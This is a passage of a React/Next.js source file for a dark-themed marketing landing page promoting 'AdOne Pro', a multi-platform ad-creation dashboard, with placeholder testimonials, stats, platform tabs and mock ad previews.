"use client"
import { useState, useEffect } from "react"
import {
  Zap,
  Target,
  TrendingUp,
  Sparkles,
  Play,
  Instagram,
  Youtube,
  Facebook,
  Search,
  ChevronRight,
  Users,
  DollarSign,
  BarChart3,
  Rocket,
  Star,
  ArrowRight,
} from "lucide-react"
import Link from "next/link"
import React from "react"
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const MultiPlatformAdLanding = () => {
  const [isVisible, setIsVisible] = useState(false)
  const [activeTab, setActiveTab] = useState(0)
  const [scrolled, setScrolled] = useState(false)
  const [activePlatform, setActivePlatform] = useState(0)

  useEffect(() => {
    setIsVisible(true)

    const handleScroll = () => {
      setScrolled(window.scrollY > 50)
    }

    window.addEventListener("scroll", handleScroll)
    return () => window.removeEventListener("scroll", handleScroll)
  }, [])

  const testimonials = [
    {
      name: "Sarah Chen",
      role: "Marketing Director",
      company: "TechFlow",
      image: "bg-gradient-to-br from-gray-600 to-gray-700",
      quote: "This platform transformed our ad strategy. We saw 400% ROI increase in just 3 months!",
      rating: 5,
    },
    {
      name: "Marcus Rodriguez",
      role: "E-commerce Owner",
      company: "StyleHub",
      image: "bg-gradient-to-br from-gray-500 to-gray-600",
      quote: "Managing ads across all platforms was a nightmare. Now it's seamless and automated.",
      rating: 5,
    },
    {
      name: "Emily Watson",
      role: "Agency Founder",
      company: "Digital Boost",
      image: "bg-gradient-to-br from-gray-700 to-gray-800",
      quote: "Our clients love the unified reporting. We've scaled from 10 to 100+ campaigns effortlessly.",
      rating: 5,
    },
  ]

  const platformFeatures = [
    {
      platform: "Google Ads",
      icon: Search,
      features: [
        "Smart Keyword Research",
        "Automated Bidding",
        "Performance Max Campaigns",
        "Landing Page Optimization",
      ],
      color: "from-gray-600 to-gray-700",
      users: "4B+ Users",
      description: "Dominate search results with AI-powered Google Ads that convert",
      demoVideo: "https://example.com/videos/google-ads-demo.mp4",
      demoPoster: "https://example.com/images/google-ads-poster.jpg",
    },
    {
      platform: "Facebook",
      icon: Facebook,
      features: ["Advanced Audience Targeting", "Creative Testing", "Conversion Optimization", "Retargeting Campaigns"],
      color: "from-gray-700 to-gray-800",
      users: "3B+ Users",
      description: "Reach your ideal customers with precision Facebook advertising",
      demoVideo: "https://example.com/videos/facebook-demo.mp4",
      demoPoster: "https://example.com/images/facebook-poster.jpg",
    },
    {
      platform: "Instagram",
      icon: Instagram,
      features: ["Story Ads Creation", "Shopping Integration", "Influencer Matching", "Visual Content AI"],
      color: "from-gray-500 to-gray-600",
      users: "2B+ Users",
      description: "Create stunning visual campaigns that drive engagement and sales",
      demoVideo: "https://example.com/videos/instagram-demo.mp4",
      demoPoster: "https://example.com/images/instagram-poster.jpg",
    },
    {
      platform: "YouTube",
      icon: Youtube,
      features: ["Video Ad Creation", "Audience Insights", "Campaign Optimization", "Brand Safety Tools"],
      color: "from-gray-600 to-gray-700",
      users: "2B+ Users",
      description: "Captivate audiences with powerful video advertising campaigns",
      demoVideo: "https://example.com/videos/youtube-demo.mp4",
      demoPoster: "https://example.com/images/youtube-poster.jpg",
    },
  ]

  const features = [
    {
      icon: Zap,
      title: "One-Click Campaign Creation",
      description: "Create ads across all platforms simultaneously with our unified dashboard",
    },
    {
      icon: Target,
      title: "AI-Powered Targeting",
      description: "Smart audience optimization that adapts to each platform's unique algorithms",
    },
    {
      icon: TrendingUp,
      title: "Cross-Platform Analytics",
      description: "Unified reporting dashboard to track performance across all your campaigns",
    },
    {
      icon: Rocket,
      title: "Auto-Optimization",
      description: "AI continuously optimizes your campaigns for maximum ROI across platforms",
    },
    {
      icon: Users,
      title: "Audience Sync",
      description: "Seamlessly sync audiences between platforms for consistent targeting",
    },
    {
      icon: BarChart3,
      title: "Smart Bidding",
      description: "Intelligent bid management across Google, Facebook, Instagram, and YouTube",
    },
  ]

  const stats = [
    { value: "500%", label: "Average ROI Increase" },
    { value: "10x", label: "Faster Campaign Setup" },
    { value: "95%", label: "Time Saved" },
    { value: "50K+", label: "Active Users" },
  ]

  return (
    <div className="min-h-screen bg-gray-900 relative overflow-hidden">
      {/* Navigation Bar */}
      <nav className="fixed top-0 left-0 right-0 z-50 transition-all duration-300">
        <div className="max-w-7xl mx-auto px-6">
          <div className="flex items-center justify-between h-20">
            {/* Logo */}
            <div className="flex items-center space-x-3">
              <div className="relative">
                <div className="absolute -inset-2 bg-gray-700/30 rounded-xl blur-lg"></div>
                <div className="relative bg-gray-700 p-3 rounded-xl">
                  <Rocket size={24} className="text-white" />
                </div>
              </div>
              <span className="text-2xl font-bold text-white">AdOne Pro</span>
            </div>

            {/* Navigation Links */}
            <div className="hidden md:flex items-center space-x-8">
              {["Features", "Platforms", "Pricing", "Testimonials", "Resources"].map((item) => (
                <a
                  key={item}
                  href={`#${item.toLowerCase()}`}
                  className="text-gray-400 hover:text-white transition-colors duration-300 font-medium"
                >
                  {item}
                </a>
              ))}
            </div>

            {/* CTA Button */}
            <div className="flex items-center space-x-4">
              <button className="text-gray-400 hover:text-white transition-colors duration-300 font-medium">
                Login
              </button>
              <button className="bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-xl font-bold hover:shadow-lg transition-all duration-300 transform hover:scale-105 text-white">
                Get Started Free
              </button>
            </div>
          </div>
        </div>
      </nav>

      {/* Animated Background Elements */}
      <div className="absolute inset-0">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-gray-800/10 rounded-full blur-3xl animate-pulse"></div>
        <div
          className="absolute top-3/4 right-1/4 w-96 h-96 bg-gray-700/10 rounded-full blur-3xl animate-pulse"
          style={{ animationDelay: "2s" }}
        ></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gray-800/5 rounded-full blur-3xl"></div>
      </div>

      {/* Floating Particles */}
      <div className="absolute inset-0 overflow-hidden">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute w-2 h-2 bg-gray-500 rounded-full opacity-20 animate-pulse"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${2 + Math.random() * 2}s`,
            }}
          />
        ))}
      </div>

      <div className="relative z-10 max-w-7xl mx-auto px-6 pt-32 pb-12">
        {/* Hero Section */}
        <div
          className={`grid lg:grid-cols-2 gap-16 items-center mb-32 transition-all duration-1000 ${isVisible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"}`}
        >
          {/* Left Content */}
          <div className="space-y-8">
            <div className="relative">
              <div className="absolute -inset-8 bg-gray-800/20 rounded-[4rem] blur-3xl"></div>
              <h1 className="relative text-4xl sm:text-5xl lg:text-7xl font-bold leading-tight">
                <span className="text-white block">Create Ads</span>
                <span className="text-gray-300 block mt-2">Everywhere</span>
                <span className="text-gray-400 block mt-2">From One Dashboard</span>
              </h1>
            </div>

            <p className="text-lg lg:text-xl text-gray-400 font-light leading-relaxed">
              The ultimate AI-powered platform to create, manage, and optimize ads across
              <span className="text-gray-300 font-semibold"> Google, Facebook, Instagram, and YouTube </span>
              with unprecedented ease and efficiency.
            </p>

            {/* Platform Icons */}
            <div className="flex flex-wrap gap-4">
              {platformFeatures.map((platform, index) => (
                <div key={index} className="group relative">
                  <div className="absolute -inset-2 bg-gray-700/20 rounded-xl blur-lg group-hover:blur-xl transition-all duration-500 opacity-0 group-hover:opacity-100"></div>
                  <div
                    className={`relative bg-gradient-to-br ${platform.color} p-3 rounded-xl shadow-xl transform group-hover:scale-110 transition-all duration-300 flex items-center space-x-2`}
                  >
                    <platform.icon size={20} className="text-white" />
                    <span className="text-white text-sm font-medium">{platform.platform}</span>
                  </div>
                </div>
              ))}
            </div>

            {/* CTA Buttons */}
            <div className="flex flex-col sm:flex-row gap-4">
              <Link href="/campaign">
                <button className="group relative bg-gray-700 hover:bg-gray-600 px-8 py-4 rounded-xl font-bold text-lg hover:shadow-2xl transition-all duration-300 overflow-hidden transform hover:scale-105 text-white">
                  <span className="relative z-10 flex items-center justify-center">
                    <Rocket size={20} className="mr-2" />
                    Start Creating Now
                    <ArrowRight
                      size={18}
                      className="ml-2 group-hover:translate-x-1 transition-transform duration-300"
                    />
                  </span>
                </button>
              </Link>
              <button className="group flex items-center justify-center px-8 py-4 rounded-xl border border-gray-600 hover:border-gray-500 text-gray-400 hover:text-gray-300 transition-all duration-300 bg-gray-800/50 backdrop-blur-sm">
                <Play size={18} className="mr-2" />
                <span className="font-medium">Watch Demo</span>
              </button>
            </div>

            {/* Social Proof */}
            <div className="flex items-center space-x-4 text-gray-500">
              <div className="flex -space-x-2">
                {[...Array(5)].map((_, i) => (
                  <div
                    key={i}
                    className={`w-8 h-8 rounded-full border-2 border-gray-700 ${
                      i === 0
                        ? "bg-gradient-to-br from-gray-600 to-gray-700"
                        : i === 1
                          ? "bg-gradient-to-br from-gray-500 to-gray-600"
                          : i === 2
                            ? "bg-gradient-to-br from-gray-700 to-gray-800"
                            : i === 3
                              ? "bg-gradient-to-br from-gray-600 to-gray-700"
                              : "bg-gradient-to-br from-gray-500 to-gray-600"
                    } flex items-center justify-center`}
                  >
                    <Star size={12} className="text-white" />
                  </div>
                ))}
              </div>
              <div className="text-sm">
                Trusted by <span className="text-gray-300 font-bold">50,000+</span> marketers
              </div>
            </div>
          </div>

          {/* Right Content - Two Reel Videos */}
          <div className="relative lg:justify-self-end">
            <div className="flex gap-6 justify-center">
              {/* First Phone Frame */}
              <div className="relative w-64 h-[480px] bg-gradient-to-b from-gray-800 to-gray-900 rounded-[2.5rem] p-2 shadow-2xl shadow-gray-800/20 transform rotate-3 hover:rotate-0 transition-all duration-500">
                <div className="w-full h-full bg-black rounded-[2rem] overflow-hidden relative">
                  {/* Phone Screen Bezels */}
                  <div className="absolute top-4 left-1/2 transform -translate-x-1/2 w-24 h-4 bg-gray-900 rounded-full"></div>

                  {/* Video Container */}
                  <div className="relative w-full h-full bg-gradient-to-br from-gray-800 via-gray-700 to-gray-600 overflow-hidden">
                    {/* Simulated Video Content */}
                    <div className="absolute inset-0 bg-gradient-to-br from-gray-700/20 via-gray-600/20 to-gray-500/20 animate-pulse"></div>

                    {/* Dashboard Preview Animation */}
                    <div className="absolute inset-3 space-y-3 animate-pulse">
                      {/* Header */}
                      <div className="bg-gradient-to-r from-gray-700 to-gray-600 h-8 rounded-lg flex items-center justify-center">
                        <Target size={16} className="text-white animate-spin" />
                      </div>

                      {/* Ad Creation Flow */}
                      <div className="space-y-2">
                        <div className="bg-gray-800 h-12 rounded-lg p-2 flex items-center space-x-2">
                          <div className="w-8 h-8 bg-gradient-to-br from-gray-600 to-gray-700 rounded-full flex items-center justify-center">
                            <Users size={12} className="text-white" />
                          </div>
                          <div className="flex-1 space-y-1">
                            <div className="bg-gray-600 h-2 rounded w-3/4"></div>
                            <div className="bg-gray-700 h-1 rounded w-1/2"></div>
                          </div>
                        </div>

                        <div className="bg-gray-800 h-12 rounded-lg p-2 flex items-center space-x-2">
                          <div className="w-8 h-8 bg-gradient-to-br from-gray-500 to-gray-600 rounded-full flex items-center justify-center">
                            <BarChart3 size={12} className="text-white" />
                          </div>
                          <div className="flex-1 space-y-1">
                            <div className="bg-gray-600 h-2 rounded w-2/3"></div>
                            <div className="bg-gray-700 h-1 rounded w-3/4"></div>
                          </div>
                        </div>
                      </div>

                      {/* Performance Metrics */}
                      <div className="grid grid-cols-2 gap-2">
                        <div className="bg-gray-800 p-2 rounded-lg text-center">
                          <div className="text-gray-300 font-bold text-sm">2.5M</div>
                          <div className="text-gray-500 text-xs">Reach</div>
                        </div>
                        <div className="bg-gray-800 p-2 rounded-lg text-center">
                          <div className="text-gray-300 font-bold text-sm">12%</div>
                          <div className="text-gray-500 text-xs">CTR</div>
                        </div>
                      </div>
                    </div>

                    {/* Floating Action Elements */}
                    <div
                      className="absolute top-16 right-3 bg-gray-600 p-2 rounded-full animate-bounce"
                      style={{ animationDelay: "0.5s" }}
                    >
                      <Sparkles size={10} className="text-white" />
                    </div>
                    <div
                      className="absolute top-32 left-3 bg-gray-500 p-2 rounded-full animate-bounce"
                      style={{ animationDelay: "1.5s" }}
                    >
                      <TrendingUp size={10} className="text-white" />
                    </div>

                    {/* Play Button Overlay */}
                    <div className="absolute inset-0 flex items-center justify-center bg-black/20">
                      <div className="bg-white/20 backdrop-blur-sm p-3 rounded-full border border-white/30">
                        <Play size={20} className="text-white ml-1" />
                      </div>
                    </div>

                    {/* Video Progress Bar */}
                    <div className="absolute bottom-16 left-3 right-3">
                      <div className="bg-white/20 h-1 rounded-full overflow-hidden">
                        <div className="bg-gradient-to-r from-gray-400 to-gray-300 h-full w-2/5 rounded-full animate-pulse"></div>
                      </div>
                    </div>

                    {/* Reel-style Indicators */}
                    <div className="absolute right-3 bottom-24 space-y-4">
                      <div className="text-center">
                        <div className="bg-white/20 p-2 rounded-full mb-1">
                          <Users size={14} className="text-white" />
                        </div>
                        <span className="text-white text-xs">2.5M</span>
                      </div>
                      <div className="text-center">
                        <div className="bg-white/20 p-2 rounded-full mb-1">
                          <DollarSign size={14} className="text-white" />
                        </div>
                        <span className="text-white text-xs">300%</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Second Phone Frame */}
              <div className="relative w-64 h-[480px] bg-gradient-to-b from-gray-800 to-gray-900 rounded-[2.5rem] p-2 shadow-2xl shadow-gray-700/20 transform -rotate-3 hover:rotate-0 transition-all duration-500 mt-8">
                <div className="w-full h-full bg-black rounded-[2rem] overflow-hidden relative">
                  {/* Phone Screen Bezels */}
                  <div className="absolute top-4 left-1/2 transform -translate-x-1/2 w-24 h-4 bg-gray-900 rounded-full"></div>

                  {/* Video Container */}
                  <div className="relative w-full h-full bg-gradient-to-br from-gray-700 via-gray-600 to-gray-500 overflow-hidden">
                    {/* Simulated Video Content */}
                    <div
                      className="absolute inset-0 bg-gradient-to-br from-gray-600/20 via-gray-500/20 to-gray-400/20 animate-pulse"
                      style={{ animationDelay: "1s" }}
                    ></div>

                    {/* Dashboard Preview Animation */}
                    <div className="absolute inset-3 space-y-3 animate-pulse" style={{ animationDelay: "0.5s" }}>
                      {/* Header */}
                      <div className="bg-gradient-to-r from-gray-600 to-gray-500 h-8 rounded-lg flex items-center justify-center">
                        <Zap size={16} className="text-white animate-spin" />
                      </div>

                      {/* Multi-Platform Display */}
                      <div className="grid grid-cols-2 gap-1">
                        {platformFeatures.slice(0, 4).map((platform, index) => (
                          <div
                            key={index}
                            className={`bg-gradient-to-br ${platform.color} h-16 rounded-lg flex flex-col items-center justify-center transform hover:scale-105 transition-all duration-300`}
                            style={{ animationDelay: `${index * 0.3}s` }}
                          >
                            <platform.icon size={12} className="text-white mb-1" />
                            <span className="text-white text-xs font-medium">{platform.platform}</span>
                          </div>
                        ))}
                      </div>

                      {/* Analytics Chart */}
                      <div className="bg-gray-800 h-16 rounded-lg p-2 flex items-end space-x-1">
                        {[...Array(6)].map((_, i) => (
                          <div
                            key={i}
                            className="bg-gradient-to-t from-gray-600 to-gray-400 rounded-sm flex-1 animate-pulse"
                            style={{
                              height: `${20 + Math.random() * 60}%`,
                              animationDelay: `${i * 0.2}s`,
                              animationDuration: "2.5s",
                            }}
                          ></div>
                        ))}
                      </div>

                      {/* ROI Stats */}
                      <div className="grid grid-cols-2 gap-2">
                        <div className="bg-gray-800 p-2 rounded-lg text-center">
                          <div className="text-gray-300 font-bold text-sm">500%</div>
                          <div className="text-gray-500 text-xs">ROI</div>
                        </div>
                        <div className="bg-gray-800 p-2 rounded-lg text-center">
                          <div className="text-gray-300 font-bold text-sm">95%</div>
                          <div className="text-gray-500 text-xs">Automated</div>
                        </div>
                      </div>
                    </div>

                    {/* Floating Action Elements */}
                    <div
                      className="absolute top-16 left-3 bg-gray-500 p-2 rounded-full animate-bounce"
                      style={{ animationDelay: "2s" }}
                    >
                      <Target size={10} className="text-white" />
                    </div>
                    <div
                      className="absolute bottom-28 right-6 bg-gray-600 p-2 rounded-full animate-bounce"
                      style={{ animationDelay: "2.5s" }}
                    >
                      <Rocket size={10} className="text-white" />
                    </div>

                    {/* Play Button Overlay */}
                    <div className="absolute inset-0 flex items-center justify-center bg-black/20">
                      <div className="bg-white/20 backdrop-blur-sm p-3 rounded-full border border-white/30">
                        <Play size={20} className="text-white ml-1" />
                      </div>
                    </div>

                    {/* Video Progress Bar */}
                    <div className="absolute bottom-16 left-3 right-3">
                      <div className="bg-white/20 h-1 rounded-full overflow-hidden">
                        <div
                          className="bg-gradient-to-r from-gray-400 to-gray-300 h-full w-3/5 rounded-full animate-pulse"
                          style={{ animationDelay: "1s" }}
                        ></div>
                      </div>
                    </div>

                    {/* Reel-style Indicators */}
                    <div className="absolute right-3 bottom-24 space-y-4">
                      <div className="text-center">
                        <div className="bg-white/20 p-2 rounded-full mb-1">
                          <BarChart3 size={14} className="text-white" />
                        </div>
                        <span className="text-white text-xs">500%</span>
                      </div>
                      <div className="text-center">
                        <div className="bg-white/20 p-2 rounded-full mb-1">
                          <Zap size={14} className="text-white" />
                        </div>
                        <span className="text-white text-xs">AI</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Enhanced Glow Effect */}
            <div className="absolute -inset-12 bg-gradient-to-r from-gray-700/10 via-gray-600/20 to-gray-500/10 rounded-[6rem] blur-3xl -z-10"></div>
          </div>
        </div>

        {/* Stats Section */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-24">
          {stats.map((stat, index) => (
            <div key={index} className="text-center group">
              <div className="relative">
                <div className="absolute -inset-4 bg-gray-700/10 rounded-2xl blur-xl group-hover:blur-2xl transition-all duration-500 opacity-0 group-hover:opacity-100"></div>
                <div className="relative bg-gray-800/60 backdrop-blur-2xl border border-gray-700/30 rounded-2xl p-8 transform group-hover:scale-105 transition-all duration-300">
                  <div className="text-4xl lg:text-5xl font-bold text-white mb-2">{stat.value}</div>
                  <div className="text-gray-400 font-medium">{stat.label}</div>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Platform Mastery Section */}
        <section className="mb-24">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold mb-6">
              <span className="text-white">Master Every Platform</span>
            </h2>
            <p className="text-xl text-gray-400 max-w-3xl mx-auto">
              Deep dive into platform-specific features and see how our AI optimizes for each channel
            </p>
          </div>

          {/* Platform Tabs */}
          <div className="flex flex-wrap justify-center gap-4 mb-12">
            {platformFeatures.map((platform, index) => (
              <button
                key={index}
                onClick={() => setActivePlatform(index)}
                className={`flex items-center space-x-3 px-6 py-3 rounded-xl font-medium transition-all duration-300 ${
                  activePlatform === index
                    ? "bg-gray-700 text-white shadow-lg"
                    : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 hover:text-gray-300"
                }`}
              >
                <platform.icon size={20} />
                <span>{platform.platform}</span>
                <span className="text-xs bg-gray-600 px-2 py-1 rounded-full">{platform.users}</span>
              </button>
            ))}
          </div>

          {/* Active Platform Content */}
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* Left: Platform Details */}
            <div className="space-y-8">
              <div>
                <div className="flex items-center space-x-4 mb-6">
                  <div className={`bg-gradient-to-br ${platformFeatures[activePlatform].color} p-4 rounded-2xl`}>
                    {React.createElement(platformFeatures[activePlatform].icon, { size: 32, className: "text-white" })}
                  </div>
                  <div>
                    <h3 className="text-3xl font-bold text-white">{platformFeatures[activePlatform].platform}</h3>
                    <p className="text-gray-400">{platformFeatures[activePlatform].users} reach potential</p>
                  </div>
                </div>
                <p className="text-lg text-gray-300 leading-relaxed">{platformFeatures[activePlatform].description}</p>
              </div>

              {/* Features List */}
              <div className="space-y-4">
                <h4 className="text-xl font-bold text-white mb-4">Key Features</h4>
                {platformFeatures[activePlatform].features.map((feature, index) => (
                  <div key={index} className="flex items-center space-x-3 group">
                    <div className="w-2 h-2 bg-gray-400 rounded-full group-hover:bg-gray-300 transition-colors duration-300"></div>
                    <span className="text-gray-300 group-hover:text-white transition-colors duration-300">
                      {feature}
                    </span>
                  </div>
                ))}
              </div>

              {/* CTA */}
              <div className="flex space-x-4">
                <button className="bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-xl font-medium text-white transition-all duration-300 transform hover:scale-105">
                  Start Campaign
                </button>
                <button className="border border-gray-600 hover:border-gray-500 px-6 py-3 rounded-xl font-medium text-gray-400 hover:text-gray-300 transition-all duration-300">
                  View Demo
                </button>
              </div>
            </div>

            {/* Right: Interactive Demo */}
            <div className="relative">
              <div className="bg-gray-800/60 backdrop-blur-2xl border border-gray-700/30 rounded-3xl p-8 shadow-2xl">
                <div className="absolute inset-0 bg-gradient-to-br from-gray-700/5 via-transparent to-gray-600/5 rounded-3xl"></div>

                {/* Demo Header */}
                <div className="relative z-10 mb-6">
                  <div className="flex items-center justify-between mb-4">
                    <h4 className="text-lg font-bold text-white">Campaign Dashboard</h4>
                    <div className="flex space-x-2">
                      <div className="w-3 h-3 bg-gray-600 rounded-full"></div>
                      <div className="w-3 h-3 bg-gray-500 rounded-full"></div>
                      <div className="w-3 h-3 bg-gray-400 rounded-full"></div>
                    </div>
                  </div>

                  {/* Platform Indicator */}
                  <div className="flex items-center space-x-3 mb-6">
                    <div className={`bg-gradient-to-br ${platformFeatures[activePlatform].color} p-2 rounded-lg`}>
                      {React.createElement(platformFeatures[activePlatform].icon, {
                        size: 16,
                        className: "text-white",
                      })}
                    </div>
                    <span className="text-gray-300 font-medium">
                      {platformFeatures[activePlatform].platform} Campaign
                    </span>
                  </div>
                </div>

                {/* Demo Content */}
                <div className="relative z-10 space-y-6">
                  {/* Performance Metrics */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="bg-gray-700/50 p-4 rounded-xl">
                      <div className="text-2xl font-bold text-white mb-1">
                        {activePlatform === 0
                          ? "2.5M"
                          : activePlatform === 1
                            ? "1.8M"
                            : activePlatform === 2
                              ? "3.2M"
                              : "1.1M"}
                      </div>
                      <div className="text-gray-400 text-sm">Impressions</div>
                    </div>
                    <div className="bg-gray-700/50 p-4 rounded-xl">
                      <div className="text-2xl font-bold text-white mb-1">
                        {activePlatform === 0
                          ? "12.5%"
                          : activePlatform === 1
                            ? "8.3%"
                            : activePlatform === 2
                              ? "15.7%"
                              : "6.2%"}
                      </div>
                      <div className="text-gray-400 text-sm">CTR</div>
                    </div>
                  </div>

                  {/* Chart Visualization */}
                  <div className="bg-gray-700/30 p-4 rounded-xl">
                    <div className="flex items-end space-x-2 h-24">
                      {[...Array(7)].map((_, i) => (
                        <div
                          key={i}
                          className={`bg-gradient-to-t ${platformFeatures[activePlatform].color} rounded-sm flex-1 transition-all duration-500`}
                          style={{
                            height: `${Math.random() * 80 + 20}%`,
                            animationDelay: `${i * 0.1}s`,
                          }}
                        ></div>
                      ))}
                    </div>
                    <div className="text-gray-400 text-sm mt-2">Performance over last 7 days</div>
                  </div>

                  {/* AI Insights */}
                  <div className="bg-gray-700/30 p-4 rounded-xl">
                    <div className="flex items-center space-x-2 mb-2">
                      <Sparkles size={16} className="text-gray-400" />
                      <span className="text-gray-300 font-medium">AI Insights</span>
                    </div>
                    <p className="text-gray-400 text-sm">
                      {activePlatform === 0 && "Increase bid by 15% for 'marketing automation' keywords"}
                      {activePlatform === 1 && "Lookalike audiences performing 23% better than interests"}
                      {activePlatform === 2 && "Story ads generating 2x more engagement than feed posts"}
                      {activePlatform === 3 && "Video completion rate improved by 18% with shorter hooks"}
                    </p>
                  </div>
                </div>
              </div>

              {/* Floating Elements */}
              <div className="absolute -top-4 -right-4 bg-gray-600 p-3 rounded-full shadow-lg animate-bounce">
                <TrendingUp size={20} className="text-white" />
              </div>
              <div
                className="absolute -bottom-4 -left-4 bg-gray-500 p-3 rounded-full shadow-lg animate-bounce"
                style={{ animationDelay: "1s" }}
              >
                <Target size={20} className="text-white" />
              </div>
            </div>
          </div>
        </section>

        {/* Platform Showcase Section */}
        <section className="mb-24 overflow-hidden">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold mb-6">
              <span className="text-white">See Your Ads Come to Life</span>
            </h2>
            <p className="text-xl text-gray-400 max-w-3xl mx-auto">
              Preview how your ads will look on mobile devices across all platforms
            </p>
          </div>

          {/* Infinite Scrolling Container */}
          <div className="relative">
            <div className="absolute left-0 top-0 bottom-0 w-32 bg-gradient-to-r from-gray-900 to-transparent z-10"></div>
            <div className="absolute right-0 top-0 bottom-0 w-32 bg-gradient-to-l from-gray-900 to-transparent z-10"></div>

            <div className="flex animate-scroll">
              {/* Ad items */}
              {[
                // Google Search Ad
                {
                  platform: "Google Search",
                  icon: Search,
                  color: "from-gray-600 to-gray-700",
                  content: (
                    <div className="bg-white text-black p-4 rounded-lg">
                      <div className="flex items-center mb-2">
                        <div className="w-4 h-4 bg-green-500 rounded-full mr-2"></div>
                        <span className="text-xs text-green-600 font-medium">Ad</span>
                      </div>
                      <h3 className="text-blue-600 font-semibold text-sm mb-1">Best Marketing Tools | Free Trial</h3>
                      <p className="text-xs text-gray-600 mb-2">www.example.com</p>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        Boost your ROI with AI-powered ad campaigns. Get started free today and see results in 24 hours.
                      </p>
                    </div>
                  ),
                },
                // Instagram Story Ad
                {
                  platform: "Instagram Stories",
                  icon: Instagram,
                  color: "from-gray-600 to-gray-700",
                  content: (
                    <div className="bg-gradient-to-br from-gray-700 to-gray-600 p-4 rounded-lg relative overflow-hidden">
                      <div className="absolute top-2 left-2 bg-white/20 backdrop-blur-sm rounded-full px-2 py-1">
                        <span className="text-white text-xs font-medium">Sponsored</span>
                      </div>
                      <div className="h-32 flex items-center justify-center">
                        <div className="text-center">
                          <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center mb-2 mx-auto">
                            <Sparkles className="text-white" size={24} />
                          </div>
                          <p className="text-white font-bold text-sm">Transform Your Business</p>
                          <p className="text-white/80 text-xs">Swipe up to learn more</p>
                        </div>
                      </div>
                      <div className="absolute bottom-2 right-2">
                        <div className="bg-white/20 backdrop-blur-sm rounded-full p-2">
                          <ArrowRight className="text-white" size={16} />
                        </div>
                      </div>
                    </div>
                  ),
                },
                // Facebook Feed Ad
                {
                  platform: "Facebook Feed",
                  icon: Facebook,
                  color: "from-gray-700 to-gray-800",
                  content: (
                    <div className="bg-white text-black rounded-lg overflow-hidden">
                      <div className="p-3 border-b border-gray-200">
                        <div className="flex items-center">
                          <div className="w-8 h-8 bg-gradient-to-br from-gray-600 to-gray-700 rounded-full flex items-center justify-center mr-3">
                            <Rocket className="text-white" size={16} />
                          </div>
                          <div className="flex-1">
                            <p className="font-semibold text-sm">AdOne Pro</p>
                            <p className="text-xs text-gray-500">Sponsored</p>
                          </div>
                        </div>
                      </div>
                      <div className="bg-gradient-to-br from-gray-500 to-gray-600 h-20 flex items-center justify-center">
                        <p className="text-white font-bold text-sm">Create Ads Everywhere</p>
                      </div>
                      <div className="p-3">
                        <p className="text-xs text-gray-800 mb-2">
                          The ultimate platform for multi-platform advertising
                        </p>
                        <button className="bg-gray-600 text-white px-4 py-1 rounded text-xs font-medium">
                          Learn More
                        </button>
                      </div>
                    </div>
                  ),
                },
                // YouTube Ad
                {
                  platform: "YouTube",
                  icon: Youtube,
                  color: "from-gray-600 to-gray-700",
                  content: (
                    <div className="bg-black text-white rounded-lg overflow-hidden relative">
                      <div className="bg-gray-800 h-24 flex items-center justify-center relative">
                        <div className="absolute top-2 right-2 bg-gray-500 text-white px-2 py-1 rounded text-xs font-bold">
                          Ad
                        </div>
                        <div className="text-center">
                          <Play className="text-gray-400 mx-auto mb-1" size={24} />
                          <p className="text-xs">Video Ad Preview</p>
                        </div>
                      </div>
                      <div className="p-3">
                        <p className="text-sm font-medium mb-1">AdOne Pro - Create Ads Everywhere</p>
                        <p className="text-xs text-gray-400 mb-2">AdOne Pro • 1.2M views</p>
                        <p className="text-xs text-gray-300">Transform your advertising strategy...</p>
                      </div>
                    </div>
                  ),
                },
              ]
                .concat([
                  // Duplicate for seamless scrolling
                  {
                    platform: "Google Search",
                    icon: Search,
                    color: "from-gray-600 to-gray-700",
                    content: (
                      <div className="bg-white text-black p-4 rounded-lg">
                        <div className="flex items-center mb-2">
                          <div className="w-4 h-4 bg-green-500 rounded-full mr-2"></div>
                          <span className="text-xs text-green-600 font-medium">Ad</span>
                        </div>
                        <h3 className="text-blue-600 font-semibold text-sm mb-1">Best Marketing Tools | Free Trial</h3>
                        <p className="text-xs text-gray-600 mb-2">www.example.com</p>
                        <p className="text-xs text-gray-800 leading-relaxed">
                          Boost your ROI with AI-powered ad campaigns. Get started free today and see results in 24
                          hours.
                        </p>
                      </div>
                    ),
                  },
                  {
                    platform: "Instagram Stories",
                    icon: Instagram,
                    color: "from-gray-600 to-gray-700",
                    content: (
                      <div className="bg-gradient-to-br from-gray-700 to-gray-600 p-4 rounded-lg relative overflow-hidden">
                        <div className="absolute top-2 left-2 bg-white/20 backdrop-blur-sm rounded-full px-2 py-1">
                          <span className="text-white text-xs font-medium">Sponsored</span>
                        </div>
                        <div className="h-32 flex items-center justify-center">
                          <div className="text-center">
                            <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center mb-2 mx-auto">
                              <Sparkles className="text-white" size={24} />
                            </div>
                            <p className="text-white font-bold text-sm">Transform Your Business</p>
                            <p className="text-white/80 text-xs">Swipe up to learn more</p>
                          </div>
                        </div>
                        <div className="absolute bottom-2 right-2">
                          <div className="bg-white/20 backdrop-blur-sm rounded-full p-2">
                            <ArrowRight className="text-white" size={16} />
                          </div>
                        </div>
                      </div>
                    ),
                  },
                  {
                    platform: "Facebook Feed",
                    icon: Facebook,
                    color: "from-gray-700 to-gray-800",
                    content: (
                      <div className="bg-white text-black rounded-lg overflow-hidden">
